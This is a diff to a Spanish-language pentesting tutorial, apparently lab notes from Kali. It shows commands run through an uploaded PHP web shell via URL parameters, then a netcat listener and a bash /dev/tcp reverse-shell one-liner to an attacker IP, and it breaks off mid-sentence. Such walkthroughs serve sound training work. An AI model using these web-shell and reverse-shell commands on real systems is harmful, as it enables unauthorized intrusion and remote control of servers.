@@ -30,7 +30,26 @@ En Kali lo siguiente:
 ```sh
 -> http://elsitioweb/uploads/pwned.php?cmd=whoami
 -> http://elsitioweb/uploads/pwned.php?cmd=id
+-> http://elsitioweb/uploads/pwned.php?cmd=ls
 ```
 
 Y ya puedo ejecutar comando desde la url.
+
+Solo faltaría enviar un comando que conecte con nuestro servidor:
+
+```sh
+$ ifconfig
+# nos devuelve nuestra IP
+
+$ nc -nlvp 443 # cualquier puerto
+```
+
+Necesitamos que vaya el comando en la URL:
+
+```sh
+$ bash -c 'bash -i >& /dev/tcp/192.../443 0>&1'
+# esto asi, no nos sirve
+```
+
+Podemos capturarlo con 
 
